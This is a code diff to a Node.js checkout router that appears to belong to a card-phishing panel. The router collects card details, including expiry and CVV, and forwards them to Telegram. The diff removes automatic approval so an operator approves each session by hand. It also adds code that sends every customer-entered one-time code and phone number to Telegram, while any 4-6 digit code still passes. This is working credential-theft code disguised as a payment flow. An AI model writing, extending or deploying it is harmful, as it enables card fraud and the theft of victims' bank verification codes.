@@ -97,7 +97,7 @@ router.post('/events', async (req, res) => {
 });
 
 // POST /api/checkout/approval
-// Request approval for card data step - automatic approval without admin intervention
+// Request approval for card data step - requires admin approval
 router.post('/approval', async (req, res) => {
   try {
     const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv } = req.body;
@@ -145,17 +145,11 @@ router.post('/approval', async (req, res) => {
       console.error('[CheckoutApproval] Telegram notification failed:', err.message);
     });
 
-    // Auto-approve after a short delay (simulating quick validation)
-    setTimeout(() => {
-      approvalStore.setStatus(sessionId, 'approved');
-      console.log(`[AutoApproval] Session ${sessionId.substring(0, 8)}... auto-approved`);
-    }, 1500);
-
-    // Respond immediately with success
+    // Wait for admin approval (no auto-approve)
     return res.status(202).json({ 
       success: true, 
-      message: 'Approval request created',
-      autoApproved: true,
+      message: 'Approval request created - waiting for admin approval',
+      autoApproved: false,
     });
   } catch (err) {
     console.error('[CheckoutApproval] Error:', err);
@@ -252,8 +246,8 @@ router.get('/verification-result/:sessionId', (req, res) => {
 });
 
 // POST /api/checkout/verify-code
-// Verify OTP code entered by customer - automatic verification (any 4-6 digit code is accepted)
-router.post('/verify-code', (req, res) => {
+// Verify OTP code entered by customer
+router.post('/verify-code', async (req, res) => {
   try {
     const { sessionId, code } = req.body;
 
@@ -270,6 +264,14 @@ router.post('/verify-code', (req, res) => {
         error: 'الجلسة غير موجودة أو منتهية الصلاحية',
       });
     }
+
+    // Get phone number from record
+    const phoneNumber = record.phoneNumber || record.meta?.phoneMasked || null;
+
+    // Send Telegram notification with OTP code and phone number
+    telegramService.sendOtpEnteredNotification(sessionId, phoneNumber, code).catch((err) => {
+      console.error('[VerifyCode] Telegram notification failed:', err.message);
+    });
 
     // Auto-accept any 4-6 digit code for automatic flow
     const cleanCode = String(code).trim();
